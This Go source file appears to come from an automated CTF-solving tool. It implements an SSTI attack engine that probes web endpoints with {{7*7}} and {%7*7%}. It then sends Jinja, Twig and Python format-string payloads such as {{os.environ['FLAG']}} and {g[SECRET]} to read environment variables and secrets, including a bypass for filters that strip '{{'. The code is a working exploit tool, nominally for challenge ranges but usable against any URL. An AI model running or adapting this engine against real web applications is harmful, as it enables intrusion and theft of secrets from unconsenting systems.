package ctfplatform

// ssti_attack.go —— SSTI 深度引擎：Jinja 环境逃逸 / format string 全局可达 / 黑名单绕过。
//
// 三类模板注入（对应 ssti_range.py 靶场，双语言机验）：
//  1. Jinja {{ }}  —— 先 {{7*7}} 探测求值（响应出现 49），再经 os 读环境变量取 flag。
//  2. format 注入  —— 用户输入是 str.format 的格式串：{g[SECRET]} 读靶机全局常量。
//  3. 黑名单绕过   —— "{{"/"}}" 被剥掉但引擎支持 Twig {% %} 定界：{%...%} 同样逃逸。
//
// env 变量名/全局常量名从题目描述提取（读题能力），未命中走常见名单。

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

// reSSTIEnvVar 描述里的环境变量名形态（UPPER_SNAKE，含 FLAG/SECRET 更可信）。
var reSSTIEnvVar = regexp.MustCompile(`\b([A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+|[A-Z][A-Z0-9]{2,20})\b`)

// sstiCommonEnvVars 常见 flag 环境变量名（描述无线索时兜底）。
var sstiCommonEnvVars = []string{
	"FLAG", "FLAG1", "FLAG2", "GZCTF_FLAG", "CTF_FLAG", "SECRET", "SECRET_FLAG",
	"SSTI_EXPR_FLAG", "SSTI_FILT_FLAG", "SSTI_FLAG", "APP_FLAG", "ENV_FLAG",
}

// sstiExtractEnvNames 从题目文本提取 env 候选（含 FLAG/SECRET 的词优先）。
func sstiExtractEnvNames(text string) []string {
	var out []string
	seen := map[string]bool{}
	add := func(s string) {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	var flagged, plain []string
	for _, m := range reSSTIEnvVar.FindAllStringSubmatch(text, 40) {
		w := m[1]
		up := strings.ToUpper(w)
		if up == w && len(w) >= 3 && !hintParamBlacklist[w] {
			if strings.Contains(w, "FLAG") || strings.Contains(w, "SECRET") || strings.Contains(w, "KEY") {
				flagged = append(flagged, w)
			} else {
				plain = append(plain, w)
			}
		}
	}
	for _, w := range flagged {
		add(w)
	}
	for _, w := range sstiCommonEnvVars {
		add(w)
	}
	for _, w := range plain {
		if len(out) < 20 {
			add(w)
		}
	}
	return out
}

// sstiRenderPoints 候选渲染端点与参数（hints 优先）。
func sstiRenderPoints(hints WebHints) [][2]string {
	eps := map[string]bool{}
	for _, e := range hints.Endpoints {
		if i := strings.IndexByte(e, '?'); i > 0 {
			e = e[:i]
		}
		if e != "" && e != "/" {
			eps[e] = true
		}
	}
	params := []string{}
	for _, p := range hints.Params {
		if len(p) <= 20 && !hintParamBlacklist[p] {
			params = append(params, p)
		}
	}
	params = append(params, "name", "who", "tmpl", "template", "user", "msg", "content", "q", "text")

	if len(eps) == 0 {
		for _, e := range []string{"/hello", "/greet", "/render", "/page", "/preview",
			"/welcome", "/", "/message", "/echo"} {
			eps[e] = true
		}
	}
	var out [][2]string
	seen := map[[2]string]bool{}
	for e := range eps {
		for _, p := range params {
			k := [2]string{e, p}
			if !seen[k] {
				seen[k] = true
				out = append(out, k)
			}
		}
	}
	return out
}

// sstiSend 投递一个 payload。
func sstiSend(ctx context.Context, cl *http.Client, base, ep, param, payload string) []byte {
	u := base + ep + "?" + param + "=" + url.QueryEscape(payload)
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", "SecAutoMind/1.7")
	resp, err := cl.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return b
}

// AttackSSTI 对靶机执行 SSTI 深度链，返回命中的 flag。
func AttackSSTI(ctx context.Context, baseURL string, hints WebHints, descText string) []string {
	cl := webClient(6 * time.Second)
	base := strings.TrimRight(baseURL, "/")
	envNames := sstiExtractEnvVars(descText)

	seen := map[string]bool{}
	var flags []string
	record := func(b []byte) bool {
		found := false
		for _, f := range bfxScanVariants(b) {
			if !seen[f] {
				seen[f] = true
				flags = append(flags, f)
				found = true
			}
		}
		return found
	}

	points := sstiRenderPoints(hints)
	if len(points) > 60 {
		points = points[:60]
	}

	// ── 攻击 2：format string（无探测成本，直接投） ──
	formatPayloads := []string{
		"{g[SECRET]}", "{g['SECRET']}", "{g[FLAG]}", "{g['FLAG']}",
		"{g}", "{g.__class__}", "{0.__class__}", "{g.__init__}",
	}

	// ── 攻击 1/3：Jinja 与 Twig 定界族（先 7*7 求值探测再取值） ──
	jinjaProbe := "{{7*7}}"
	twigProbe := "{%7*7%}"
	for _, pt := range points {
		ep, param := pt[0], pt[1]
		if ctx.Err() != nil {
			return flags
		}
		// Jinja 探测：{{7*7}} → 49
		body := sstiSend(ctx, cl, base, ep, param, jinjaProbe)
		if body != nil && strings.Contains(string(body), "49") {
			for _, env := range envNames {
				for _, tpl := range []string{
					"{{os.environ['%s']}}",
					"{{os.environ.get('%s')}}",
				} {
					if record(sstiSend(ctx, cl, base, ep, param,
						strings.Replace(tpl, "%s", env, 1))) {
						return flags
					}
				}
			}
			if record(sstiSend(ctx, cl, base, ep, param, "{{os.environ}}")) {
				return flags
			}
		}
		// Twig 探测：{%7*7%} → 49（黑名单剥 {{ 后仍可绕过）
		body = sstiSend(ctx, cl, base, ep, param, twigProbe)
		if body != nil && strings.Contains(string(body), "49") {
			for _, env := range envNames {
				for _, tpl := range []string{
					"{%os.environ['%s']%}",
					"{%os.environ.get('%s')%}",
				} {
					if record(sstiSend(ctx, cl, base, ep, param,
						strings.Replace(tpl, "%s", env, 1))) {
						return flags
					}
				}
			}
		}
		// format string
		for _, p := range formatPayloads {
			if record(sstiSend(ctx, cl, base, ep, param, p)) {
				return flags
			}
		}
	}
	return flags
}

// sstiExtractEnvVars 兼容旧名（供测试与生产入口）。
func sstiExtractEnvVars(text string) []string { return sstiExtractEnvNames(text) }

// sstiAttackFromText 生产入口：题目文本 → SSTI 链。
func sstiAttackFromText(ctx context.Context, text string) []string {
	if strings.EqualFold(os.Getenv("SECAUTOMIND_WEB_EXPLOIT"), "0") {
		return nil
	}
	var targets []string
	for _, m := range reHTTPURL.FindAllString(text, 8) {
		u := strings.TrimRight(m, ".,;:)]}>\"'")
		if pu, err := url.Parse(u); err == nil &&
			(pu.Scheme == "http" || pu.Scheme == "https") && pu.Host != "" {
			targets = append(targets, strings.TrimRight(u, "/"))
		}
	}
	if len(targets) == 0 {
		return nil
	}
	if len(targets) > 2 {
		targets = targets[:2]
	}
	hints := ParseWebHints(text)

	var out []string
	for _, t := range targets {
		tctx, cancel := context.WithTimeout(ctx, 60*time.Second)
		out = append(out, AttackSSTI(tctx, t, hints, text)...)
		cancel()
	}
	return sstiDedup(out)
}

func sstiDedup(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	return out
}

func init() {
	RegisterSolver(SolverEntry{
		Name: "ssti_eval_escape", Category: CategoryWebS, Priority: 31,
		Solver: func(ctx context.Context, text string, attachments map[string]string) []string {
			return sstiAttackFromText(ctx, text)
		},
	})
}
